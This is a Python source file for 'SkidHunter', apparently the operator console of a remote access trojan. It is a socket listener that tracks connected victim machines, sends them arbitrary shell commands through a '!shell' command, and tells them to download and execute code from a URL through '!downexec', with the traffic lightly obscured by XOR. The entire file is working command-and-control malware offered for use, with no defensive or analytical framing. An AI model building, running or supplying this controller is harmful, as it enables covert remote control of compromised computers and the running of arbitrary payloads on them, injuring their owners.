import sys
import socket
import time
import string
import threading
import random
from colorama import Fore, Back, Style
import colorama
import requests
import json
import os

colorama.just_fix_windows_console()

config = json.load(open("config.json","rb"))

print(Style.BRIGHT)

header = Fore.RED+"""
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@       @@@@@@@@@@@@@@@@
@@@@@@@@@@@@                 @@@@@@@@@@@
@@@@@@@@@@                     @@@@@@@@@
@@@@@@@@@                       @@@@@@@@
@@@@@@@@@                       @@@@@@@@
@@@@@@@@@                       @@@@@@@@
@@@@@@@@@    @@@@@@   @@@@@@    @@@@@@@@
@@@@@@@@@@   @@@@@@   @@@@@@   @@@@@@@@@
@@@@@@@@@@*         @         &@@@@@@@@@
@@@@@@@@@@@@                 @@@@@@@@@@@
@@@@@@@    @@@@@         @@@@@    @@@@@@
@@@@@@@     @@@@/       %@@@@     @@@@@@
@@@@@           @@@@@@@@@           @@@@
@@@@@@@@@@@@@@             @@@@@@@@@@@@@
@@@@@@@@@@@@@@@           @@@@@@@@@@@@@@
@@@@@            @@@@@@@            @@@@
@@@@@@       @@@@@@@@@@@@@@@       @@@@@
@@@@@@@    @@@@@@@@@@@@@@@@@@@    @@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
"""+Fore.RESET

lett=Fore.GREEN+"""

  ██████ ██ ▄█▀██▓█████▄ 
▒██    ▒ ██▄█▒▓██▒██▀ ██▌
░ ▓██▄  ▓███▄░▒██░██   █▌
  ▒   ██▓██ █▄░██░▓█▄   ▌
▒██████▒▒██▒ █░██░▒████▓ 
▒ ▒▓▒ ▒ ▒ ▒▒ ▓░▓  ▒▒▓  ▒ 
░ ░▒  ░ ░ ░▒ ▒░▒ ░░ ▒  ▒ 
░  ░  ░ ░ ░░ ░ ▒ ░░ ░  ░ 
      ░ ░  ░   ░    ░    
                  ░   
                  
 ██░ ██ █    ██ ███▄    █▄▄▄█████▓█████ ██▀███  
▓██░ ██▒██  ▓██▒██ ▀█   █▓  ██▒ ▓▓█   ▀▓██ ▒ ██▒
▒██▀▀██▓██  ▒██▓██  ▀█ ██▒ ▓██░ ▒▒███  ▓██ ░▄█ ▒
░▓█ ░██▓▓█  ░██▓██▒  ▐▌██░ ▓██▓ ░▒▓█  ▄▒██▀▀█▄  
░▓█▒░██▒▒█████▓▒██░   ▓██░ ▒██▒ ░░▒████░██▓ ▒██▒
 ▒ ░░▒░░▒▓▒ ▒ ▒░ ▒░   ▒ ▒  ▒ ░░  ░░ ▒░ ░ ▒▓ ░▒▓░
 ▒ ░▒░ ░░▒░ ░ ░░ ░░   ░ ▒░   ░    ░ ░  ░ ░▒ ░ ▒░
 ░  ░░ ░░░░ ░ ░   ░   ░ ░  ░        ░    ░░   ░ 
 ░  ░  ░  ░             ░           ░  ░  ░     
                                              
"""+Fore.RESET

motd = """Welcome to SkidHunter
type !help to view the help menu
happy hunting!
"""

helpmenu = """!shell <ip> <command> - run command on the skid's box
!downexec <ip> <url> - download and execute from url
!connected - list connected skids
!exit - stop skidhunting for now
"""

cmds = {}
connected = []

def crypt(string_c): 
 string_c_new = ""
 enckey = config["encrypt_key"]
 for i in range(len(string_c)):
  string_c_new += chr(ord(string_c[i]) ^ ord(enckey[i % len(enckey)]))
 return string_c_new

def handler(s, addr):
 global cmds, connected
 while 1:
  try:
   if addr[0] in cmds:
    s.send(crypt(cmds[addr[0]]).encode())
    print("Sent command to: {}".format(addr[0]))
    del cmds[addr[0]]
    datas = crypt(s.recv(1000000).decode())
    print()
    print(datas)
    print()
  except Exception as error:
   for _ in connected:
    if _ == addr[0]:
     print("{} disconnected.".format(addr[0]))
     connected.remove(_)

def listener():
 global connected
 s = socket.socket()
 s.bind((config["bind_addr"], config["bind_port"]))
 s.listen(100000)
 while 1:
  snew,saddr = s.accept()
  if not saddr[0] in connected:
   connected.append(saddr[0])
  print("New connection from: {}".format(saddr[0]))
  t=threading.Thread(target=handler, args=(snew, saddr))
  t.start()
  
def parse_cmd(cmd):
 global cmds
 if cmd.startswith("!help"):
  print()
  print(helpmenu)
  print()
 elif cmd.startswith("!shell "):
  ip = cmd.split("!shell ")[1].split(" ")[0] 
  cmd = " ".join(cmd.split(" ")[2:])
  cmds[ip] = cmd
  print()
  print("Set command for {} -> {}".format(ip, cmd))
  print()
 elif cmd.startswith("!connected"):
  print()
  print("\n".join(connected))
  print()
 elif cmd.startswith("!exit"):
  print()
  print("Done hunting already?")
  os._exit(0)
  print()
 elif cmd.startswith("!downexec "):
  ip = cmd.split("!downexec ")[1].split(" ")[0]
  url = cmd.split(" ")[2]
  cmds[ip] = "!downexec {}".format(url)
  print()
  print("{} -> Downloading and executing {}".format(ip, url))
  print()
  
def main():
 print()
 print(header)
 print()
 time.sleep(2)
 print()
 print(lett)
 print()
 time.sleep(2)
 print()
 print(motd)
 print()
 t=threading.Thread(target=listener)
 t.start()
 while 1:
  cmd = input(Fore.RED+"root"+Fore.CYAN+"@"+Fore.BLUE+"skidhunter "+Fore.RESET+"~#: ")
  parse_cmd(cmd)

if __name__ == "__main__":
 main()